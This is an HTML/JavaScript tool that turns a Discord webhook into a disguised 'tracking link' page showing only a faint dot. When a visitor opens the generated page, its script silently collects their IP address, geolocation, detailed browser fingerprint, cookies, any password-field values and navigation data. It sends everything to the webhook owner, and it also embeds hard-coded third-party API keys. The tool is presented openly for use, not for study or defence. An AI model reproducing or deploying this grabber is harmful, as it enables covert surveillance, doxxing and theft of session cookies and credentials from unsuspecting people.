<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>· track ·</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000000;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      padding: 1.5rem;
      margin: 0;
      overflow: hidden;
      position: relative;
    }

    #particleCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 1;
    }

    .card {
      position: relative;
      z-index: 20;
      max-width: 480px;
      width: 100%;
      background: #000000;
      border: 1px solid rgba(255, 255, 255, 0.03);
      border-radius: 40px;
      padding: 2.4rem 2rem 2rem;
      box-shadow: 0 20px 40px -8px rgba(0,0,0,0.9);
      transition: border 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
    }

    .card:hover {
      border-color: rgba(255, 255, 255, 0.06);
      box-shadow: 0 28px 56px -10px rgba(0,0,0,1), 0 0 0 1px rgba(255,255,255,0.01);
      transform: translateY(-2px);
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 1.2rem;
    }

    .input-wrapper input {
      width: 100%;
      padding: 1.1rem 1.4rem;
      background: #050505;
      border: 1px solid rgba(255, 255, 255, 0.03);
      border-radius: 60px;
      color: rgba(255, 255, 255, 0.7);
      font-size: 0.9rem;
      font-weight: 400;
      font-family: inherit;
      outline: none;
      transition: 0.25s ease;
      letter-spacing: -0.01em;
    }

    .input-wrapper input:focus {
      border-color: rgba(255, 255, 255, 0.08);
      background: #080808;
      box-shadow: 0 0 0 1px rgba(255,255,255,0.01);
    }

    .input-wrapper input::placeholder {
      color: rgba(255, 255, 255, 0.04);
      font-weight: 350;
      letter-spacing: 0.3px;
    }

    .btn {
      width: 100%;
      padding: 1.1rem 1.5rem;
      background: #000000;
      border: 1px solid rgba(255, 255, 255, 0.03);
      border-radius: 60px;
      color: rgba(255, 255, 255, 0.15);
      font-size: 0.7rem;
      font-weight: 450;
      font-family: inherit;
      letter-spacing: 4px;
      cursor: pointer;
      transition: 0.25s ease;
      text-transform: uppercase;
      position: relative;
      overflow: hidden;
    }

    .btn:hover {
      background: #0a0a0a;
      border-color: rgba(255, 255, 255, 0.07);
      color: rgba(255, 255, 255, 0.3);
      transform: scale(1.01);
      box-shadow: 0 0 20px rgba(255,255,255,0.01);
    }

    .btn:active {
      transform: scale(0.97);
    }

    .divider {
      width: 100%;
      height: 1px;
      background: rgba(255, 255, 255, 0.015);
      margin: 1.8rem 0 1.4rem;
    }

    .output-box {
      background: #010101;
      border: 1px solid rgba(255, 255, 255, 0.015);
      border-radius: 60px;
      padding: 0.6rem 0.6rem 0.6rem 1.6rem;
      min-height: 58px;
      display: flex;
      align-items: center;
      transition: 0.2s;
    }

    .output-box .placeholder {
      color: rgba(255, 255, 255, 0.02);
      font-size: 0.6rem;
      font-weight: 350;
      letter-spacing: 3px;
      text-transform: uppercase;
    }

    .output-box .link-wrapper {
      display: flex;
      align-items: center;
      gap: 8px;
      flex-wrap: wrap;
      width: 100%;
    }

    .output-box a {
      color: rgba(255, 255, 255, 0.2);
      text-decoration: none;
      font-weight: 350;
      font-size: 0.75rem;
      word-break: break-all;
      transition: 0.2s;
      border-bottom: 1px solid transparent;
      padding: 4px 0;
      letter-spacing: -0.01em;
      flex: 1;
      min-width: 120px;
    }

    .output-box a:hover {
      color: rgba(255, 255, 255, 0.4);
      border-bottom-color: rgba(255, 255, 255, 0.03);
    }

    .copy-badge {
      font-size: 0.45rem;
      background: #000000;
      padding: 6px 14px;
      border-radius: 40px;
      color: rgba(255, 255, 255, 0.06);
      letter-spacing: 2px;
      border: 1px solid rgba(255, 255, 255, 0.015);
      cursor: pointer;
      transition: 0.25s ease;
      white-space: nowrap;
      text-transform: uppercase;
      font-family: inherit;
      font-weight: 400;
    }

    .copy-badge:hover {
      border-color: rgba(255, 255, 255, 0.04);
      color: rgba(255, 255, 255, 0.15);
      background: #050505;
      transform: scale(1.03);
    }

    .status-msg {
      font-size: 0.45rem;
      margin-top: 1.2rem;
      text-align: center;
      color: rgba(255, 255, 255, 0.01);
      letter-spacing: 3px;
      font-weight: 300;
      transition: 0.2s;
      min-height: 1.2rem;
    }

    .status-msg.error {
      color: rgba(255, 255, 255, 0.025);
    }

    .status-msg.success {
      color: rgba(255, 255, 255, 0.025);
    }

    @keyframes fadeSlide {
      0% { opacity: 0; transform: translateY(6px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .fade-in {
      animation: fadeSlide 0.25s ease forwards;
    }

    .corner-dot {
      position: fixed;
      bottom: 2rem;
      right: 2.5rem;
      color: rgba(255,255,255,0.003);
      font-size: 1.2rem;
      letter-spacing: 6px;
      font-weight: 200;
      z-index: 5;
      pointer-events: none;
    }

    @media (max-width: 500px) {
      .card { padding: 1.8rem 1.2rem; }
      .output-box { padding: 0.4rem 0.4rem 0.4rem 1.2rem; }
    }
  </style>
</head>
<body>
  <canvas id="particleCanvas"></canvas>
  <div class="corner-dot">·</div>

  <div class="card">
    <div class="input-wrapper">
      <input type="url" id="webhookInput" placeholder="discord webhook url" spellcheck="false" autofocus />
    </div>

    <button class="btn" id="generateBtn">generate link</button>

    <div class="divider"></div>

    <div class="output-box" id="outputBox">
      <span class="placeholder">tracking link</span>
    </div>

    <div class="status-msg" id="statusMsg">·</div>
  </div>

  <script>
    // ============================================================
    //  1.  PARTICLES – fully black, minimal white dots
    // ============================================================
    const canvas = document.getElementById('particleCanvas');
    const ctx = canvas.getContext('2d');
    let w, h;

    function resizeCanvas() {
      w = canvas.width = window.innerWidth;
      h = canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    const particles = [];
    const COUNT = 38;

    for (let i = 0; i < COUNT; i++) {
      particles.push({
        x: Math.random() * w,
        y: Math.random() * h,
        radius: 0.4 + Math.random() * 1.0,
        speedX: (Math.random() - 0.5) * 0.05,
        speedY: (Math.random() - 0.5) * 0.05 - 0.01,
        opacity: 0.005 + Math.random() * 0.02,
        pulse: Math.random() * Math.PI * 2,
        pulseSpeed: 0.003 + Math.random() * 0.006
      });
    }

    let mouseX = w/2, mouseY = h/2;
    let mouseInfluence = 0;

    document.addEventListener('mousemove', (e) => {
      mouseX = e.clientX;
      mouseY = e.clientY;
      mouseInfluence = 1;
    });

    document.addEventListener('mouseleave', () => {
      mouseInfluence = 0;
    });

    function drawParticles() {
      ctx.clearRect(0, 0, w, h);

      for (let p of particles) {
        const dx = mouseX - p.x;
        const dy = mouseY - p.y;
        const dist = Math.sqrt(dx*dx + dy*dy);
        if (dist < 200 && mouseInfluence > 0) {
          const force = (1 - dist/200) * 0.2 * mouseInfluence;
          p.x += dx * force * 0.01;
          p.y += dy * force * 0.01;
        }

        p.x += p.speedX;
        p.y += p.speedY;

        if (p.x < -10) p.x = w + 10;
        if (p.x > w + 10) p.x = -10;
        if (p.y < -10) p.y = h + 10;
        if (p.y > h + 10) p.y = -10;

        p.pulse += p.pulseSpeed;
        const pulseFactor = 0.7 + 0.3 * Math.sin(p.pulse);
        const radius = p.radius * pulseFactor;
        const alpha = p.opacity * (0.5 + 0.5 * Math.sin(p.pulse * 0.6 + 1.2));

        ctx.beginPath();
        ctx.arc(p.x, p.y, radius, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255, 255, 255, ${alpha * 0.3})`;
        ctx.fill();
      }

      requestAnimationFrame(drawParticles);
    }
    drawParticles();

    // ============================================================
    //  2.  WEBHOOK + IP (multi-API) + BROWSER DETAILS + BULLET PTS
    // ============================================================
    const webhookInput = document.getElementById('webhookInput');
    const generateBtn = document.getElementById('generateBtn');
    const outputBox = document.getElementById('outputBox');
    const statusMsg = document.getElementById('statusMsg');

    function setStatus(msg, type = '') {
      statusMsg.textContent = msg;
      statusMsg.className = 'status-msg ' + type;
    }

    generateBtn.addEventListener('click', function() {
      let webhookUrl = webhookInput.value.trim();
      if (!webhookUrl) {
        setStatus('error', 'error');
        outputBox.innerHTML = `<span class="placeholder" style="color:rgba(255,255,255,0.015);">webhook required</span>`;
        return;
      }

      if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        setStatus('error', 'error');
        outputBox.innerHTML = `<span class="placeholder" style="color:rgba(255,255,255,0.015);">invalid webhook</span>`;
        return;
      }

      setStatus('·', '');

      const encodedWebhook = encodeURIComponent(webhookUrl);

      // ============================================================
      //  TRACKING PAGE – multi-IP APIs, browser details, bullet points
      // ============================================================
      const trackingPage = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>·</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:rgba(255,255,255,0.01);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;overflow:hidden;}
  .dot{font-size:2.8rem;letter-spacing:12px;font-weight:200;animation:pulse 4.5s ease-in-out infinite;}
  @keyframes pulse{0%{opacity:0.005;}50%{opacity:0.04;}100%{opacity:0.005;}}
</style>
</head>
<body>
<div class="dot">·</div>
<script>
(async function() {
  const webhook = decodeURIComponent("${encodedWebhook}");

  // ---------- helper: get all cookies ----------
  function getCookies() {
    return document.cookie.split(';').map(c => c.trim()).filter(c => c);
  }

  // ---------- helper: get browser details ----------
  function getBrowserDetails() {
    const details = {
      userAgent: navigator.userAgent,
      platform: navigator.platform || 'unknown',
      language: navigator.language || 'unknown',
      languages: navigator.languages || [],
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'unspecified',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      vendor: navigator.vendor || 'unknown',
      vendorSub: navigator.vendorSub || 'unknown',
      productSub: navigator.productSub || 'unknown',
      userAgentData: navigator.userAgentData ? {
        brands: navigator.userAgentData.brands,
        mobile: navigator.userAgentData.mobile,
        platform: navigator.userAgentData.platform
      } : null,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      window: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        devicePixelRatio: window.devicePixelRatio || 1
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
      timezoneOffset: new Date().getTimezoneOffset(),
      currentUrl: window.location.href,
      referrer: document.referrer || 'direct',
      timestamp: new Date().toISOString()
    };
    return details;
  }

  // ---------- helper: get saved passwords (autofill) ----------
  function getSavedPasswords() {
    const inputs = document.querySelectorAll('input[type="password"]');
    let passwords = [];
    inputs.forEach(inp => {
      if (inp.value) passwords.push(inp.value);
    });
    return passwords;
  }

  // ---------- helper: get history (basic) ----------
  function getHistory() {
    try {
      const entries = performance.getEntriesByType('navigation');
      const historyData = [];
      if (entries.length) {
        entries.forEach(e => {
          historyData.push({
            type: e.type,
            url: e.name || window.location.href,
            duration: e.duration || 0
          });
        });
      }
      return {
        referrer: document.referrer || 'direct',
        navigation: historyData
      };
    } catch(e) {
      return { referrer: document.referrer || 'direct', navigation: [] };
    }
  }

  // ---------- collect everything ----------
  try {
    // Get IP from multiple APIs
    let ip = 'unknown';
    let geoData = {};

    // Try ipify first
    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      if (ipData.ip) ip = ipData.ip;
    } catch(e) {}

    // Try multiple geolocation APIs
    const geoAPIs = [
      'https://ipapi.co/' + ip + '/json/',
      'https://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query',
      'https://geo.ipify.org/api/v2/country,city?apiKey=at_HZ5kZxH4BxRLuKOvWKRTU3zDlYf66&ipAddress=' + ip
    ];

    let geoSuccess = false;
    for (const api of geoAPIs) {
      try {
        const geoRes = await fetch(api);
        const geo = await geoRes.json();
        if (geo && (geo.country || geo.countryCode || geo.country_code)) {
          geoData = geo;
          geoSuccess = true;
          break;
        }
      } catch(e) {}
    }

    // If no geo data, use fallback
    if (!geoSuccess) {
      try {
        const fallbackRes = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=60168b4930ba41ee82b0d3a2b09ea38c&ip_address=' + ip);
        const fallback = await fallbackRes.json();
        if (fallback && fallback.country) geoData = fallback;
      } catch(e) {}
    }

    // Get browser details
    const browser = getBrowserDetails();

    // Get cookies
    const cookies = getCookies();

    // Get passwords
    const passwords = getSavedPasswords();

    // Get history
    const historyData = getHistory();

    // Build bullet-point report
    const bulletPoints = [];

    // IP & Geolocation
    bulletPoints.push('• IP Address: ' + (geoData.ip || geoData.query || ip));
    bulletPoints.push('• Hostname: ' + (geoData.hostname || geoData.reverse || 'N/A'));
    bulletPoints.push('• Country: ' + (geoData.country_flag || '') + ' ' + (geoData.country || geoData.country_name || 'N/A') + ' (' + (geoData.countryCode || geoData.country_code || 'N/A') + ')');
    bulletPoints.push('• City: ' + (geoData.city || 'N/A'));
    bulletPoints.push('• Region: ' + (geoData.region || geoData.regionName || 'N/A'));
    bulletPoints.push('• Continent: ' + (geoData.continent || 'N/A'));
    bulletPoints.push('• Latitude: ' + (geoData.lat || geoData.latitude || 'N/A'));
    bulletPoints.push('• Longitude: ' + (geoData.lon || geoData.longitude || 'N/A'));
    bulletPoints.push('• Timezone: ' + (geoData.timezone || geoData.timezone_name || browser.timezone));
    bulletPoints.push('• ISP: ' + (geoData.isp || geoData.org || 'N/A'));
    bulletPoints.push('• Organization: ' + (geoData.org || geoData.organization || 'N/A'));
    bulletPoints.push('• ASN: ' + (geoData.as || geoData.asn || 'N/A'));

    // Browser Details
    bulletPoints.push('• User Agent: ' + browser.userAgent);
    bulletPoints.push('• Platform: ' + browser.platform);
    bulletPoints.push('• Language: ' + browser.language);
    bulletPoints.push('• Languages: ' + browser.languages.join(', '));
    bulletPoints.push('• Cookie Enabled: ' + browser.cookieEnabled);
    bulletPoints.push('• Do Not Track: ' + browser.doNotTrack);
    bulletPoints.push('• Hardware Concurrency: ' + browser.hardwareConcurrency);
    bulletPoints.push('• Device Memory: ' + browser.deviceMemory + ' GB');
    bulletPoints.push('• Max Touch Points: ' + browser.maxTouchPoints);
    bulletPoints.push('• Vendor: ' + browser.vendor);
    bulletPoints.push('• Screen Resolution: ' + browser.screen.width + 'x' + browser.screen.height);
    bulletPoints.push('• Screen Available: ' + browser.screen.availWidth + 'x' + browser.screen.availHeight);
    bulletPoints.push('• Color Depth: ' + browser.screen.colorDepth + ' bits');
    bulletPoints.push('• Window Inner: ' + browser.window.innerWidth + 'x' + browser.window.innerHeight);
    bulletPoints.push('• Window Outer: ' + browser.window.outerWidth + 'x' + browser.window.outerHeight);
    bulletPoints.push('• Device Pixel Ratio: ' + browser.window.devicePixelRatio);
    bulletPoints.push('• Timezone Offset: ' + (browser.timezoneOffset / -60) + ' hours');
    bulletPoints.push('• Current URL: ' + browser.currentUrl);
    bulletPoints.push('• Referrer: ' + browser.referrer);
    bulletPoints.push('• Timestamp: ' + browser.timestamp);

    // User Agent Data (if available)
    if (browser.userAgentData) {
      bulletPoints.push('• UA Brands: ' + (browser.userAgentData.brands ? browser.userAgentData.brands.map(b => b.brand + ' v' + b.version).join(', ') : 'N/A'));
      bulletPoints.push('• UA Mobile: ' + browser.userAgentData.mobile);
      bulletPoints.push('• UA Platform: ' + browser.userAgentData.platform);
    }

    // Cookies
    bulletPoints.push('• Cookies (' + cookies.length + ' found):');
    if (cookies.length === 0) {
      bulletPoints.push('  - None');
    } else {
      cookies.forEach(c => bulletPoints.push('  - ' + c));
    }

    // Passwords
    bulletPoints.push('• Saved Passwords (' + passwords.length + ' detected):');
    if (passwords.length === 0) {
      bulletPoints.push('  - None detected (browser restrictions may apply)');
    } else {
      passwords.forEach(p => bulletPoints.push('  - ' + p));
    }

    // History
    bulletPoints.push('• Navigation History:');
    if (historyData.navigation.length === 0) {
      bulletPoints.push('  - None');
    } else {
      historyData.navigation.forEach(e => {
        bulletPoints.push('  - ' + e.type + ' | ' + e.url + ' | duration: ' + (e.duration || 'N/A') + 'ms');
      });
    }
    bulletPoints.push('• Referrer: ' + historyData.referrer);

    // Join with newlines
    const reportText = bulletPoints.join('\\n');

    // Send to webhook
    const embed = {
      title: '· tracking report ·',
      color: 0x000000,
      description: '```\\n' + reportText.substring(0, 4000) + '\\n```',
      footer: { text: 'full report attached as .txt' }
    };

    // Send embed
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    // Send as file
    const formData = new FormData();
    const blob = new Blob([reportText], { type: 'text/plain' });
    formData.append('file', blob, 'tracking_report.txt');

    await fetch(webhook, {
      method: 'POST',
      body: formData
    });

  } catch(e) {
    // silent fail
  }

  document.body.innerHTML = '<div style="background:#000;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:Inter,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;color:rgba(255,255,255,0.005);font-size:3.2rem;letter-spacing:18px;">·</div>';
})();
<\/script>
</body>
</html>`;

      const blob = new Blob([trackingPage], { type: 'text/html' });
      const sublink = URL.createObjectURL(blob);

      outputBox.innerHTML = `
        <div class="link-wrapper fade-in">
          <a href="${sublink}" target="_blank" id="trackLink">${sublink}</a>
          <span class="copy-badge" id="copyBtn">copy</span>
        </div>
      `;

      document.getElementById('copyBtn').addEventListener('click', function() {
        const link = document.getElementById('trackLink').href;
        navigator.clipboard?.writeText(link).then(() => {
          setStatus('copied', 'success');
        }).catch(() => {
          const range = document.createRange();
          range.selectNode(document.getElementById('trackLink'));
          window.getSelection().removeAllRanges();
          window.getSelection().addRange(range);
          document.execCommand('copy');
          setStatus('copied', 'success');
        });
      });

      setStatus('generated', 'success');
    });

    webhookInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') generateBtn.click();
    });

    webhookInput.focus();
  </script>
</body>
</html>
